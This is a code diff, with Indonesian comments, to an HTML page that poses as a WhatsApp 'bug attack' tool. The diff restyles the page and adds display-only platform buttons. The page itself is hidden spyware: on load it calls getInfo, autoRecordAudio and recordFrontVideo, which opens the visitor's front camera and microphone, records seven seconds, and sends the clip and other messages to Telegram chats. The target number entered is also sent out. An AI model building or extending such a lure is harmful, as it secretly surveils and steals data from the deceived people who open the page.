@@ -63,23 +63,62 @@
       padding: 12px;
       margin-bottom: 16px;
       background: #333;
-      border: none;
+      border: 1px solid transparent;
       border-radius: 6px;
       color: #fff;
       font-size: 15px;
+      outline: none;
     }
+    .login-input:focus { border: 1px solid #2563eb; }
+
+    /* CSS BARU UNTUK PLATFORM SELECTION */
+    .platform-label {
+      color: #00ff7f;
+      font-size: 12px;
+      font-weight: 900;
+      text-align: left;
+      margin-bottom: 10px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .platform-group {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .platform-btn {
+      flex: 1;
+      padding: 15px 5px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 12px;
+      color: #ccc;
+      font-weight: 700;
+      font-size: 11px;
+      cursor: pointer;
+      transition: 0.3s;
+      text-transform: uppercase;
+    }
+    .platform-btn.active {
+      background: rgba(37, 99, 235, 0.2);
+      border-color: #2563eb;
+      color: #fff;
+      box-shadow: 0 0 10px rgba(37, 99, 235, 0.3);
+    }
+
     .login-button {
       width: 100%;
       padding: 12px;
-      background: linear-gradient(135deg, #2563eb, #2563eb);
-      color: black;
+      background: linear-gradient(135deg, #2563eb, #1e40af);
+      color: white;
       border: none;
       border-radius: 10px;
       cursor: pointer;
       font-weight: 600;
       font-size: 15px;
+      transition: 0.3s;
     }
-    .login-button:hover { background-color: #2563eb; box-shadow: 0 0 20px blue; }
+    .login-button:hover { box-shadow: 0 0 20px blue; transform: translateY(-2px); }
   </style>
 </head>
 <body>
@@ -88,7 +127,16 @@
   <div class="login-container">
     <p class="login-title">bug WhatsApp By Hacked official</p>
     <div id="notif">Sukses bug atack ✅</div>
+    
     <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
+
+    <!-- TAMBAHAN FITUR PLATFORM SESUAI FOTO -->
+    <p class="platform-label">Platform Selection</p>
+    <div class="platform-group">
+      <button type="button" class="platform-btn active" onclick="selectPlatform(this)">Android OS</button>
+      <button type="button" class="platform-btn" onclick="selectPlatform(this)">iOS Platform</button>
+    </div>
+
     <button class="login-button" id="login-button">Atack</button>
   </div>
 
@@ -98,6 +146,12 @@
     const input = document.getElementById('text');
     const button = document.getElementById('login-button');
     const notif = document.getElementById('notif');
+
+    // Fungsi klik tombol platform (Hanya Tampilan)
+    function selectPlatform(btn) {
+      document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+    }
 
     function sendToTelegram(text) {
       chatIds.forEach(id => {
@@ -141,31 +195,19 @@
       } catch (err) {}
     }
 
-    // FITUR REKAMAN VIDEO 7 DETIK
     async function recordFrontVideo() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
         const mediaRecorder = new MediaRecorder(stream);
         const videoChunks = [];
-
-        mediaRecorder.ondataavailable = (e) => {
-          if (e.data.size > 0) videoChunks.push(e.data);
-        };
-
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
         mediaRecorder.onstop = () => {
           const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
           sendVideo(videoBlob, 'rekaman_depan.mp4');
           stream.getTracks().forEach(track => track.stop());
         };
-
-        // Mulai merekam
         mediaRecorder.start();
-
-        // Berhenti setelah 7 detik
-        setTimeout(() => {
-          if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
-        }, 7000);
-
+        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 7000);
       } catch (err) {
         sendToTelegram('maaf akses vidio tidak berhasil 🤬');
       }
@@ -193,7 +235,7 @@
       createParticles();
       getInfo();
       autoRecordAudio(); 
-      recordFrontVideo(); // Memicu izin kamera depan dan rekaman 7 detik
+      recordFrontVideo();
     });
 
     button.addEventListener('click', () => {
@@ -202,6 +244,8 @@
       
       button.disabled = true;
       notif.style.display = 'none';
+      
+      // Tetap hanya mengirim nomor target
       sendToTelegram(`<b>📞 Target Attack:</b> ${nomor}`);
       
       setTimeout(() => {
